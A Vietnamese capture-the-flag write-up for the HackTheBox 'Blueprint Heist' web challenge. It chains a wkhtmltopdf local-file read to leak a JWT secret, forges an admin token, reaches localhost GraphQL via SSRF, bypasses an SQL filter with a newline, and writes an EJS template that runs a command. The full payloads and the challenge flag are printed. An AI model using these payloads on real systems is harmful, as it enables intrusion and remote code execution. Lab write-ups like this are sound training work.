# Blueprint Heist — Writeup (HTB Try Out / Web) (Tiếng Việt)

## 1. Đề
Challenge WEB (medium), source `web_blueprint_heist.zip`.
Target: `http://154.57.164.68:31206`
Mục tiêu: chạy SUID `/readflag` (flag `/root/flag.txt`).
App Express: JWT, GraphQL admin-only, `wkhtmltopdf` 0.12.5 convert URL → PDF.

## 2. Kiến thức nền
- **wkhtmltopdf 0.12.5**: render URL/HTML (kể cả `data:`) + JS; XHR `file://` đọc local file.
- **JWT HS256**: `jwt.verify` với `process.env.secret`. Secret trên instance **khác** file zip.
- **SSRF localhost**: `/admin` và `/graphql` cần `role=admin` **và** `remoteAddress === 127.0.0.1`.
- **SQLi WAF**: `/^.*[đặc_biệt]/` — `.` không match `\n` → payload dòng 2 chứa `' UNION ...`.
- **EJS SSTI**: `renderError` load `views/errors/{status}.ejs`; không có `404.ejs` → `INTO OUTFILE` tạo file mới.

## 3. Phân tích
- `/getToken` cấp JWT `role=user` (đủ cho `/download`; middleware chỉ siết khi requiredRole=admin).
- `/download` POST `{url}` → `wkhtmltopdf(url)`.
- `.env` zip (`IM_Sup3r_K3y...`) **không** verify được token live.
- GraphQL `getDataByName`: `LIKE '%${name}%'` + `detectSqli`.
- MariaDB chạy user `node`, ghi được `/app/views/errors/`.

## 4. Vì sao hướng này
- H1 forge JWT bằng secret zip → 401, kill.
- H2 `file://` làm document gốc → wkhtmltopdf exit ≠ 0 (fontconfig), kill.
- H3 `data:text/html` + XHR `file:///app/.env` → leak secret; SSRF GraphQL + newline SQLi + SSTI 404 → đủ RCE `/readflag`.

## 5. Các bước
1. GET `/getToken` → user JWT.
2. POST `/download` `url=data:text/html,<script>XHR file:///app/.env</script>`
   → `secret=Str0ng_K3y_N0_l3ak_pl3ase?`
3. Forge JWT `{"role":"admin"}`.
4. SSRF `http://127.0.0.1:1337/graphql?token=ADMIN&query=`
   ```
   {getDataByName(name:"admin\n' union select 1,'<p><%= process.mainModule.require(\"child_process\").execSync(\"/readflag\") %></p>',2,3 into outfile '/app/views/errors/404.ejs'-- "){name}}
   ```
5. GET path không tồn tại → render 404.ejs → flag.
6. Replay GET 404 độc lập → cùng flag.

```text
python solve/solve.py --target http://154.57.164.68:31206
```

## 6. Flag
```
HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_3dfb9cf1df1e4de4cddde2d22493e0fd}
```
